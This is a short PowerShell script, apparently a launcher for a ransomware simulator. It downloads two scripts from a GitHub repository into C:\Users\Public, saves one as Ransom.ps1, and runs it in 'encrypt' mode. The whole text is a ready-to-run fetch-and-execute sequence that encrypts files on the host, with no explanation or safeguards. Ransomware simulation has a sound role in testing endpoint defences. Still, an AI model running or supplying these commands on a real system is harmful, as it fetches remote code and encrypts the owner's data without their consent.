Invoke-WebRequest -Uri https://github.com/andrefernandes86/cp-RanSim/raw/main/RanSim1.ps1 -OutFile C:\Users\Public\Ransom.ps1;
Invoke-WebRequest -Uri https://github.com/andrefernandes86/cp-RanSim/raw/main/FileCryptography.psm1 -OutFile C:\Users\Public\FileCryptography.psm1;
powershell C:\Users\Public\Ransom.ps1 -Mode encrypt;
